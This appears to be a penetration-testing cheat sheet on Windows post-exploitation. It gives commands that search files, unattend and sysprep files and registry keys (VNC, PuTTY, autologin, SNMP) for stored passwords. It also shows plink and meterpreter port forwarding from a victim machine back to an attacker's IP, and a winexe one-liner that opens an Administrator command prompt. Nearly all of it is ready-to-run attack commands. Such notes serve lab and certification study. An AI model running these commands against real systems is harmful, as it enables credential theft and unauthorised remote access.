### Cleartext Password
##### Seach for them
```bash
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```

##### In Files
-> These are common files to find them in. They might be base64-encoded. So look out for that.
```bash
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```

##### In Registry
```bash
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Port Forwarding
##### Download link for plink
-> Plink is a command line utility for Putty backend
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html

##### Open /etc/ssh/sshd_config file
-> Search for PermitRootLogin
-> Change the value `prohibit-password` to `yes` and uncomment the line
-> Restart the ssh service `service ssh restart`

##### On the target VM using plink command
```bash
plink.exe -l root -pw <password> -R <portno>:127.0.0.1:<forwarded port no> <yourIP>
```

| Commands | Use |  
| ----------- | ----------- |  
| -l | Username  |  
| -pw | Password |
| -R | Port Forward |


##### Port forward using meterpreter
```bash
portfwd add -l <attacker port> -p <victim port> -r <victim ip>
```

##### Example netstat result in port forwarding scenario
```bash

Proto  Local address      Remote address     State        User  Inode  PID/Program name
    -----  -------------      --------------     -----        ----  -----  ----------------
    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -
    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -
    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -
    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -
    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -
    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -
    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -
    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -
    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -
    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -
```
**Local address 0.0.0.0**  
Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it.

**Local address 127.0.0.1**  
Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. **This is interesting to us!**

**Local address 192.168.1.9**  
Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. **This is also interesting to us!**

##### Example to connect to the port forwarded port
###### Use this oneliner of winexe to connect and pop a command prompt
-> This is done after using plink 
```bash
winexe -U Administrator%<password> //127.0.0.1 "cmd.exe"
```

**winexe is a command line tool to run windows command from linux**

| Commands | Use |  
| ----------- | ----------- |  
| -U | Username  |  
| % | It indicates after this password is provided |
